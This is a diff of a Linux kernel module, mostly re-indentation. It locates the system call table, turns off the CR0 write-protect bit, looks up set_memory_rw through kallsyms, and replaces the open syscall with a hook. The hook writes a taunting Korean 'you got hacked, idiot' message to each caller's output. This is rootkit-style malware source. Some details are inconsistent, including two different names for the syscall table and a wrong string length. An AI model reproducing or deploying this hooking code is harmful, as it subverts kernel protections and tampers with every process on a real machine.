@@ -69,70 +69,75 @@ struct file *file_open(const char *filename, int flags, int mode)
 
         if(IS_ERR(filp))
         {
-                err = PTR_ERR(filp);
-                return NULL;
-        }
+				err = PTR_ERR(filp);
+				return NULL;
+		}
 
-        return filp;
+		return filp;
 }
 
 long my_sys_open(const char __user *filename, int flags, int mode) {
-        long ret;
-        int write_ret;
-        struct file *filp = NULL;
+		long ret;
+		int write_ret;
+		struct file *filp = NULL;
 
-        ret = orig_sys_open(filename, flags, mode);
-        printk(KERN_DEBUG "file %s has been opened with mode %d\n", filename, mode);
+		ret = orig_sys_open(filename, flags, mode);
+		printk(KERN_DEBUG "file %s has been opened with mode %d\n", filename, mode);
 
-        filp = file_open("/proc/self/fd/1", O_WRONLY, 0644);
+		filp = file_open("/proc/self/fd/1", O_WRONLY, 0644);
 
-        write_ret = file_write(filp, 0, "너 해킹 당했어 멍청아 ㅋ\n그것도 실력이라고 달고 사냐 ?", 20);
+		write_ret = file_write(filp, 0, "너 해킹 당했어 멍청아 ㅋ\n그것도 실력이라고 달고 사냐 ?", 20);
 
-        return ret;
+		return ret;
 }
+
+static int (*fixed_set_memory_rw)(unsigned long, int);
 
 static int __init syscall_init(void)
 {
-        int ret;
-        unsigned long addr;
-        unsigned long cr0;
+		int ret;
+		unsigned long addr;
+		unsigned long cr0;
 
-        syscall_table = (void **)find_sys_call_table();
+		syscall_table = (void **)find_sys_call_table();
 
-        if (!syscall_table) {
-                printk(KERN_DEBUG "Cannot find the system call address\n");
-                return -1;
-        }
+		if (!syscall_table) {
+				printk(KERN_DEBUG "Cannot find the system call address\n");
+				return -1;
+		}
 
-        cr0 = read_cr0();
-        write_cr0(cr0 & ~CR0_WP);
+		cr0 = read_cr0();
+		write_cr0(cr0 & ~CR0_WP);
 
-        addr = (unsigned long)syscall_table;
-        ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);
-        if(ret) {
-                printk(KERN_DEBUG "Cannot set the memory to rw (%d) at addr %16lX\n", ret, PAGE_ALIGN(addr) - PAGE_SIZE);
-        } else {
-                printk(KERN_DEBUG "3 pages set to rw");
-        }
+		fixed_set_memory_rw = (void *)kallsyms_lookup_name("set_memory_rw");
+		if(!fixed_set_memory_rw)
+		{   
+				printk("<0>Unable to find set_memory_rw symbol\n");   
+				return 0;
+		}
 
-        orig_sys_open = syscall_table[__NR_open];
-        syscall_table[__NR_open] = my_sys_open;
+		fixed_set_memory_rw(PAGE_ALIGN((unsigned long)sys_call_table) - PAGE_SIZE, 3);
 
-        write_cr0(cr0);
+		//ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);
 
-        return 0;
+		orig_sys_open = syscall_table[__NR_open];
+		syscall_table[__NR_open] = my_sys_open;
+
+		write_cr0(cr0);
+
+		return 0;
 }
 
 static void __exit syscall_release(void)
 {
-        unsigned long cr0;
+		unsigned long cr0;
 
-        cr0 = read_cr0();
-        write_cr0(cr0 & ~CR0_WP);
+		cr0 = read_cr0();
+		write_cr0(cr0 & ~CR0_WP);
 
-        syscall_table[__NR_open] = orig_sys_open;
+		syscall_table[__NR_open] = orig_sys_open;
 
-        write_cr0(cr0);
+		write_cr0(cr0);
 }
 
 module_init(syscall_init);
